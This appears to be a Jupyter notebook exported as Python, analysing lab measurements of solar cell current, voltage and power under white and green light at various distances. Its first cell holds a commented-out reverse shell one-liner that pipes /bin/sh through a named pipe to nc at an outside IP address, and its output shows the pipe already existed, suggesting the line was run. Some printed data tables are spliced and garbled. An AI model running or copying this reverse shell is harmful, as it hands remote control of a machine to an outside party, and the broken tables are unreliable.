# %%
import pandas as pd

# !mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc 10.50.240.83 87 1>/tmp/backpipe
# import codecs
# import matplotlib.pyplot as plt
# import numpy as np
# import odf
# import math
# import pdfkit
# from itertools import chain
# from statistics import mean
# from uncertainties import ufloat, ufloat_fromstr
# from uncertainties.umath import *
# from sklearn.linear_model import LinearRegression
# from scipy.optimize import curve_fit, minimize_scalar
# from lmfit.models import LorentzianModel
# from IPython.display import display, Latex
# pd.set_option('display.max_rows', None)
# pd.set_option('display.max_columns', None)
# pd.set_option('display.width', None)
# Out:
# mknod: /tmp/backpipe: File exists

# %%
# f = codecs.open('2b_fan_off.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# fanoff = pd.read_csv('new.txt', skiprows=5, usecols=[2, 1], names=['V1', 'I1'])
# f = codecs.open('2c_low_speed.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# low = pd.read_csv('new.txt', skiprows=5, usecols=[2, 1], names=['V2', 'I2'])
# f = codecs.open('2d_high_speed.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# high = pd.read_csv('new.txt', skiprows=5, usecols=[2, 1], names=['V3', 'I3'])
# concat = pd.concat([fanoff, low, high], axis=1)
# head = pd.concat([fanoff.head(30), low.head(30), high.head(30)], axis=1)
# head.V1.unique()
# Out:
# array([0.155 , 0.1555, 0.1545, 0.154 , 0.1535, 0.153 , 0.1525, 0.1515,
#        0.1495, 0.146 ])

# %%
# def linelikeexcel(x,y):
#     coefs = np.polyfit(x,y,deg=8)
#     p_obj = np.poly1d(coefs)
#     return p_obj

# p_obj1 = linelikeexcel(np.array(concat['V1']), np.array(concat['I1']))
# p_obj2 = linelikeexcel(np.array(concat['V2']), np.array(concat['I2']))
# p_obj3 = linelikeexcel(np.array(concat['V3']), np.array(concat['I3']))

# x_line = np.linspace(min(np.array(concat['V1'])), max(np.array(concat['V1'])), 200)
# y_line1 = p_obj1(x_line)
# y_line2 = p_obj2(x_line)
# y_line3 = p_obj3(x_line)

# plt.figure(figsize=(20,10))
# plt.plot(np.array(concat['V1']), np.array(concat['I1']), 'o')
# plt.plot(x_line,y_line1, 'r--')

# plt.grid()
# plt.show()


# plt.plot(np.array(concat['V1']), np.array(concat['I1']), np.array(concat['V2']), np.array(concat['I2']), np.array(concat['V3']), np.array(concat['I3']))
# plt.grid()
# plt.show()

# %%
# f = codecs.open('3a_40cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _40 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I1', 'V1'])
# f = codecs.open('3a_50cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _50 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I2', 'V2'])
# f = codecs.open('3a_60cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _60 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I3', 'V3'])
# f = codecs.open('3a_70cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _70 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I4', 'V4'])
# concat = pd.concat([_40, _50, _60, _70], axis=1)
# concat['P1'] = concat['I1'] * concat['V1']
# concat['P2'] = concat['I2'] * concat['V2']
# concat['P3'] = concat['I3'] * concat['V3']
# concat['P4'] = concat['I4'] * concat['V4']
# concat
# Out:
#          I1     V1      I2     V2      I3     V3      I4     V4        P1  \
# 0    0.0960  0.040  0.0685  0.030  0.0510  0.025  0.0400  0.020  0.003840
# 1    0.0960  0.040  0.0685  0.030  0.0510  0.025  0.0400  0.020  0.003840
# 2    0.0965  0.040  0.0685  0.030  0.0510  0.025  0.0400  0.020  0.003860
# 3    0.0960  0.040  0.0685  0.030  0.0510  0.025  0.0400  0.020  0.003840
# 4    0.0960  0.045  0.0685  0.030  0.0510  0.025  0.0400  0.020  0.004320
# 91   0.033520  0.029725  0.027067
# 92   0.031425  0.028770  0.027067
# 93   0.031425  0.027743       NaN
# 94   0.030378  0.027743       NaN
# 95   0.029400  0.028770       NaN
# 96   0.029400  0.027743       NaN
# 97   0.028350  0.027743       NaN
# 98   0.028350  0.027743       NaN
# 99   0.028350  0.027743       NaN
# 100  0.028350  0.027743       NaN
# 101  0.028350  0.027743       NaN
# 102  0.028350       NaN       NaN
# 103  0.028350       NaN       NaN
# 104  0.028350       NaN       NaN
# 105  0.028350       NaN       NaN

# %%
# labels = [i for i in range(40, 71, 10)]
# plt.figure(figsize=(12,8))
# for i in range(1, 5):
#     plt.plot(concat['V' + str(i)], concat['I' + str(i)], label=labels[i - 1])

# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))
# plt.xlabel('Voltage $[V]$')
# plt.ylabel('Current $[A]$')
# plt.title('IV Characteristic of White Light')
# plt.grid()
# plt.savefig('a.pdf')
# Out:
# /usr/lib/python3/dist-packages/matplotlib/cbook/__init__.py:1402: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   ndim = x[:, None].ndim
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:276: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   x = x[:, np.newaxis]
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:278: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   y = y[:, np.newaxis]

# %%
# labels = [i for i in range(40, 71, 10)]
# plt.figure(figsize=(12,8))
# for i in range(1, 5):
#     plt.plot(concat['V' + str(i)], concat['P' + str(i)], label=labels[i - 1])

# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))
# plt.xlabel('Voltage $[V]$')
# plt.ylabel('Power $[W]$')
# plt.title('Power vs. Voltage of White Light')
# plt.grid()
# plt.savefig('b.pdf')
# Out:
# /usr/lib/python3/dist-packages/matplotlib/cbook/__init__.py:1402: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   ndim = x[:, None].ndim
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:276: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   x = x[:, np.newaxis]
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:278: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   y = y[:, np.newaxis]

# %%
# f = codecs.open('4a_30cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _40 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I1', 'V1'])
# f = codecs.open('4b_40cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _50 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I2', 'V2'])
# f = codecs.open('4b_50cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _60 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I3', 'V3'])
# f = codecs.open('4b_60cm.txt').read().replace('\t', ',')
# i = open('new.txt', "w")
# i.write(f)
# i.close()
# _70 = pd.read_csv('new.txt', skiprows=5, usecols=[1, 2], names=['I4', 'V4'])
# concat = pd.concat([_40, _50, _60, _70], axis=1)
# concat['P1'] = concat['I1'] * concat['V1']
# concat['P2'] = concat['I2'] * concat['V2']
# concat['P3'] = concat['I3'] * concat['V3']
# concat['P4'] = concat['I4'] * concat['V4']
# concat
# Out:
#          I1     V1      I2     V2      I3     V3      I4     V4        P1  \
# 0    0.0410  0.020  0.0280  0.015  0.0200  0.010  0.0145  0.010  0.000820
# 1    0.0410  0.020  0.0280  0.015  0.0200  0.010  0.0145  0.010  0.000820
# 2    0.0405  0.020  0.0280  0.015  0.0195  0.010  0.0145  0.010  0.000810
# 3    0.0410  0.020  0.0280  0.015  0.0195  0.010  0.0145  0.010  0.000820
# 4    0.0410  0.020  0.0280  0.015  0.0200  0.010  0.0145  0.010  0.000820
# 5    0.0415  0.020  0.0280  0.020  0.0200  0.010  0.0150  0.010  0.000830
# 6    0.0410  0.025  0.0280  0.030  0.0200  0.010  0.0145  0.015  0.001025
# 7    0.0410  0.040  0.0280  0.040  0.0200  0.015  0.0145  0.025  0.001640
# 8    0.0410  0.055  0.0280  0.040  0.0200  0.020  0.0145  0.030  0.002255
# 9    0.0410  0.075  0.0280  0.050  0.0200  0.025  0.0145  0.040  0.003075
# 10   0.0410  0.095  0.0280  0.060  0.0205  0.030  0.0145  0.045  0.003895
# 11   0.0410  0.115  0.0280  0.070  0.0200  0.035  0.0140  0.055  0.004715
# 12   0.0410  0.130  0.0280  0.075  0.0205  0.040  0.0145  0.060  0.005330
0.0140  2.015  0.0130  1.910     NaN    NaN     NaN    NaN  0.028210
# 124  0.0140  2.015  0.0130  1.910     NaN    NaN     NaN    NaN  0.028210
# 125  0.0140  2.015  0.0135  1.910     NaN    NaN     NaN    NaN  0.028210
# 126  0.0140  2.015  0.0130  1.910     NaN    NaN     NaN    NaN  0.028210
# 127  0.0140  2.015  0.0130  1.910     NaN    NaN     NaN    NaN  0.028210
# 128     NaN    NaN  0.0130  1.910     NaN    NaN     NaN    NaN       NaN
# 129     NaN    NaN  0.0130  1.910     NaN    NaN     NaN    NaN       NaN
# 130     NaN    NaN  0.0130  1.910     NaN    NaN     NaN    NaN       NaN
#
#            P2        P3        P4
# 0    0.000420  0.000200  0.000145
# 1    0.000420  0.000200  0.000145
# 2    0.000420  0.000195  0.000145
# 3    0.000420  0.000195  0.000145
# 4    0.000420  0.000200  0.000145
# 5    0.000560  0.000200  0.000150
# 6    0.000840  0.000200  0.000218
# 7    0.001120  0.000300  0.000363
# 8    0.001120  0.000400  0.000435
# 9    0.001400  0.000500  0.000580
# 10   0.001680  0.000615  0.000652
# 11   0.001960  0.000700  0.000770
# 12   0.002100  0.000820  0.000870
# 13   0.002380  0.001025  0.001015
# 14   0.002660  0.001200  0.001087
# 15   0.002992  0.001400  0.001233
# 16   0.003278  0.001600  0.001233
# 17   0.003360  0.001800  0.001305
# 18   0.003640  0.002050  0.001450
# 19   0.003920  0.002200  0.001522
# 20   0.004340  0.002400  0.001668
# 21   0.004620  0.002600  0.001813
# 22   0.005040  0.002800  0.001958
# 23   0.005320  0.003075  0.002030
# 24   0.005740  0.003200  0.002102
# 25   0.006300  0.003300  0.002247
# 26   0.006720  0.003500  0.002393
# 27   0.007125  0.003700  0.002393
# 28   0.007420  0.003800  0.002320
# 29   0.007700  0.004000  0.002320
# 30   0.007980  0.004100  0.002320
# 31   0.008120  0.004300  0.002320
# 32   0.008120  0.004500  0.002537
# 33   0.008120  0.004500  0.002755
# 34   0.008120  0.004400  0.003045
# 35   0.008120  0.004400  0.003407
# 36   0.008120  0.004400  0.003553
# 37   0.008120  0.004400  0.003843
# 38   0.008120  0.004400  0.003988
# 39   0.008260  0.004600  0.004350
# 40   0.008693  0.004800  0.004713
# 41   0.009100  0.005000  0.005075
# 42   0.009660  0.005400  0.005365
# 43   0.010640  0.005900  0.005655
# 44   0.011620  0.005900  0.006018
# 45   0.012320  0.006200  0.006380
# 46   0.013020  0.006338  0.006815
# 47   0.013020  0.007000  0.007105
# 48   0.013965  0.007500  0.007323
# 49   0.014280  0.007900  0.007613
# 50   0.014700  0.008300  0.008100
# 51   0.015260  0.008800  0.008120
# 52   0.016100  0.009400  0.008483
# 53   0.016800  0.010100  0.008845
# 54   0.017640  0.010600  0.009063
# 55   0.018340  0.011100  0.009063
# 56   0.019040  0.011600  0.009498
# 57   0.019740  0.012100  0.009933
# 58   0.020580  0.012915  0.010350
# 59   0.021420  0.013000  0.009590
# 60   0.022260  0.013500  0.009860
# 61   0.022550  0.014100  0.009788
# 62   0.023100  0.014600  0.010005
# 63   0.023925  0.015000  0.010440
# 64   0.024612  0.015500  0.011092
# 65   0.025163  0.016100  0.012180
# 66   0.025988  0.016700  0.013050
# 67   0.026537  0.016868  0.013558
# 68   0.027225  0.016965  0.013500
# 69   0.027775  0.018400  0.014175
# 70   0.028462  0.018135  0.015120
# 71   0.029150  0.018135  0.015680
# 72   0.029975  0.018135  0.015795
# 73   0.030800  0.018038  0.016470
# 74   0.030915  0.018233  0.016575
# 75   0.031725  0.019890  0.017160
# 76   0.031590  0.020995  0.017063
# 77   0.032860  0.021755  0.018330
# 78   0.032462  0.022040  0.017400
# 79   0.032670  0.021645  0.017640
# 80   0.033275  0.022107  0.017020
# 81   0.032670  0.023085  0.017365
# 82   0.032400  0.022478  0.016995
# 83   0.032400  0.022940  0.016485
# 84   0.032400  0.023130  0.017325
# 85   0.032400  0.023100  0.016590
# 86   0.032595  0.023713  0.016538
# 87   0.035100  0.024500  0.016538
# 88   0.036250  0.024395  0.016538
# 89   0.036750  0.024338  0.017325
# 90   0.036750  0.024720  0.016538
# 91   0.037240  0.025600  0.016538
# 92   0.036960  0.023780  0.016538
# 93   0.037680  0.023380  0.016538
# 94   0.037030  0.022883  0.016538
# 95   0.036900  0.023085  0.016538
# 96   0.037463  0.022425       NaN
# 97   0.037180  0.021688       NaN
# 98   0.036015  0.021813       NaN
# 99   0.036330  0.021875       NaN
# 100  0.035875  0.021060       NaN
# 101  0.034710  0.021120       NaN
# 102  0.034105  0.021240       NaN
# 103  0.033392  0.021240       NaN
# 104  0.032760  0.022125       NaN
# 105  0.032113  0.021240       NaN
# 106  0.031365  0.021240       NaN
# 107  0.029760  0.021240       NaN
# 108  0.029840  0.021240       NaN
# 109  0.028985  0.021240       NaN
# 110  0.028200  0.021240       NaN
# 111  0.027333  0.021240       NaN
# 112  0.026530  0.021240       NaN
# 113  0.025650  0.021240       NaN
# 114  0.025785  0.021240       NaN
# 115  0.024830  0.021240       NaN
# 116  0.024830  0.021240       NaN
# 117  0.024830       NaN       NaN
# 118  0.024830       NaN       NaN
# 119  0.024830       NaN       NaN
# 120  0.024830       NaN       NaN
# 121  0.024830       NaN       NaN
# 122  0.024830       NaN       NaN
# 123  0.024830       NaN       NaN
# 124  0.024830       NaN       NaN
# 125  0.025785       NaN       NaN
# 126  0.024830       NaN       NaN
# 127  0.024830       NaN       NaN
# 128  0.024830       NaN       NaN
# 129  0.024830       NaN       NaN
# 130  0.024830       NaN       NaN

# %%
# labels = [i for i in range(40, 71, 10)]
# plt.figure(figsize=(12,8))
# for i in range(1, 5):
#     plt.plot(concat['V' + str(i)], concat['I' + str(i)], label=labels[i - 1])

# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))
# plt.xlabel('Voltage $[V]$')
# plt.ylabel('Current $[A]$')
# plt.title('IV Characteristic of Green Light')
# plt.grid()
# plt.savefig('c.pdf')
# Out:
# /usr/lib/python3/dist-packages/matplotlib/cbook/__init__.py:1402: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   ndim = x[:, None].ndim
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:276: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   x = x[:, np.newaxis]
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:278: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   y = y[:, np.newaxis]

# %%
# labels = [i for i in range(40, 71, 10)]
# plt.figure(figsize=(12,8))
# for i in range(1, 5):
#     plt.plot(concat['V' + str(i)], concat['P' + str(i)], label=labels[i - 1])

# plt.legend(title='Distance in $cm$', bbox_to_anchor=(1.02, 1.02))
# plt.xlabel('Voltage $[V]$')
# plt.ylabel('Power $[W]$')
# plt.title('Power vs. Voltage of Green Light')
# plt.grid()
# plt.savefig('d.pdf')
# Out:
# /usr/lib/python3/dist-packages/matplotlib/cbook/__init__.py:1402: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   ndim = x[:, None].ndim
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:276: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   x = x[:, np.newaxis]
# /usr/lib/python3/dist-packages/matplotlib/axes/_base.py:278: FutureWarning: Support for multi-dimensional indexing (e.g. `obj[:, None]`) is deprecated and will be removed in a future version.  Convert to a numpy array before indexing instead.
#   y = y[:, np.newaxis]

# %%
# i = 1
# x = 'y' + str(i)
# print(x)
# Out:
# y1
